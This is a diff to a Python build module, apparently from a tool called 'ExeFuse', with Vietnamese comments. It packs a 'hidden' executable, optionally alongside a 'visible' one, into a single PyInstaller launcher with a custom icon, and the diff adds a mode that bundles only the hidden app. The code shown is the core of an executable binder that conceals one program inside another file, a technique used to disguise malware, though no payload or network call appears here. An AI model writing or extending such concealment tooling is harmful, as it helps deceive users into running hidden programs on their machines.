@@ -114,8 +114,12 @@ def get_result(job_id):
 
 
 def start_job(workdir, hidden_src, visible_src, output_name,
-              kill_hidden=True, hide_watch=True, icon_src=None):
-    """Tao job build chay nguon (background thread)."""
+              kill_hidden=True, hide_watch=True, icon_src=None,
+              hidden_label=None):
+    """Tao job build chay nguon (background thread).
+
+    visible_src co the la None -> che do SOLO (chi nhung app an).
+    """
     if not pyinstaller_available():
         raise RuntimeError(
             "PyInstaller chưa được cài đặt. Hãy mở terminal và chạy: "
@@ -125,7 +129,8 @@ def start_job(workdir, hidden_src, visible_src, output_name,
     thread = threading.Thread(
         target=_build_worker,
         args=(job, workdir, hidden_src, visible_src, output_name,
-              bool(kill_hidden), bool(hide_watch), icon_src),
+              bool(kill_hidden), bool(hide_watch), icon_src,
+              hidden_label or os.path.basename(hidden_src)),
         daemon=True,
     )
     thread.start()
@@ -133,7 +138,7 @@ def start_job(workdir, hidden_src, visible_src, output_name,
 
 
 def _build_worker(job, workdir, hidden_src, visible_src, output_name,
-                  kill_hidden, hide_watch, icon_src):
+                  kill_hidden, hide_watch, icon_src, hidden_label):
     try:
         _update(job, status="building")
         out_name = _safe_name(output_name)
@@ -147,25 +152,31 @@ def _build_worker(job, workdir, hidden_src, visible_src, output_name,
         launcher_src = (
             template
             .replace("%%HIDDEN_NAME%%", HIDDEN_ASSET)
-            .replace("%%VISIBLE_NAME%%", VISIBLE_ASSET)
+            .replace("%%VISIBLE_NAME%%", VISIBLE_ASSET if visible_src else "")
             .replace("%%KILL_HIDDEN%%", "True" if kill_hidden else "False")
             .replace("%%HIDE_WATCH%%", "True" if hide_watch else "False")
         )
         launcher_py = os.path.join(workdir, "launcher.py")
         with open(launcher_py, "w", encoding="utf-8") as f:
             f.write(launcher_src)
-        _log(job, "[ExeFuse] Đã sinh launcher.py (kill_hidden=%s, hide_watch=%s)"
-             % (kill_hidden, hide_watch))
+        mode_text = "GHÉP ĐÔI (1 ẩn + 1 hiện)" if visible_src else "SOLO (chỉ app ẩn)"
+        _log(job, "[ExeFuse] Đã sinh launcher.py — chế độ: %s" % mode_text)
+        _log(job, "[ExeFuse] File ẨN:   %s" % hidden_label)
 
-        # 2. Copy 2 file upload voi ten asset co dinh
+        # 2. Copy file upload voi ten asset co dinh
         hidden_asset = os.path.join(workdir, HIDDEN_ASSET)
-        visible_asset = os.path.join(workdir, VISIBLE_ASSET)
         shutil.copyfile(hidden_src, hidden_asset)
-        shutil.copyfile(visible_src, visible_asset)
         _log(job, "[ExeFuse] Nhúng file ẨN:   %s (%.1f MB)"
              % (HIDDEN_ASSET, os.path.getsize(hidden_asset) / 1048576.0))
-        _log(job, "[ExeFuse] Nhúng file HIỆN: %s (%.1f MB)"
-             % (VISIBLE_ASSET, os.path.getsize(visible_asset) / 1048576.0))
+
+        visible_asset = None
+        if visible_src:
+            visible_asset = os.path.join(workdir, VISIBLE_ASSET)
+            shutil.copyfile(visible_src, visible_asset)
+            _log(job, "[ExeFuse] Nhúng file HIỆN: %s (%.1f MB)"
+                 % (VISIBLE_ASSET, os.path.getsize(visible_asset) / 1048576.0))
+        else:
+            _log(job, "[ExeFuse] Chế độ SOLO: không nhúng app hiển thị")
         if icon_src:
             _log(job, "[ExeFuse] Icon tùy chỉnh: app.ico")
 
@@ -188,8 +199,9 @@ def _build_worker(job, workdir, hidden_src, visible_src, output_name,
             "--workpath", build_dir,
             "--specpath", spec_dir,
             "--add-binary", hidden_asset + sep + ".",
-            "--add-binary", visible_asset + sep + ".",
         ]
+        if visible_asset:
+            cmd += ["--add-binary", visible_asset + sep + "."]
         if icon_src:
             cmd += ["--icon", icon_src]
         cmd.append(launcher_py)
